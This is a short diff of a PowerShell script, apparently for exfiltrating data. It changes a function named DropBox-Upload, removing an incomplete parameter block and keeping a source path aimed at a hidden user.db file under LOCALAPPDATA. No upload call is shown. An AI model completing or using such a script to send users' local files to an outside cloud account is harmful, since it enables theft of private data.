@@ -2,11 +2,6 @@ $db = ""
 function DropBox-Upload {
 
 [CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-) 
 
 $SourceFilePath = "%LOCALAPPDATA%\Microsoft\user.db"
 $outputFile = Split-Path $SourceFilePath -leaf
